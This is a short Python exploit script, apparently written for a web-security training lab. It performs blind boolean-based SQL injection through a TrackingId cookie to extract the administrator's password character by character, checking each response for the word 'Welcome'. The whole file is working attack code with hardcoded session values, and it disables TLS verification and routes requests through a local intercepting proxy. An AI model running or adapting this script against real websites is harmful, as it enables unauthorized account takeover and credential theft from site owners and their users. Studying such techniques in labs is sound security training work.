import sys
import string
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    # Restrict search space to a-z and 0-9 (36 possibilities vs 94)
    charset = string.ascii_lowercase + string.digits 
    
    for i in range(1, 21):
        for char in charset:
            # Simplified payload: direct string comparison without unnecessary ascii() wrapper
            sqli_payload = f"' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}'--"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            
            cookies = {
                'TrackingId': 'gcoeGai2s4eR9Yce' + sqli_payload_encoded, 
                'session': 'WgcibNvWfZzbGjboHQHLWt5rS7h2CN5X'
            }
            
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            
            if "Welcome" in r.text:
                password_extracted += char
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + char)
                sys.stdout.flush()

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()

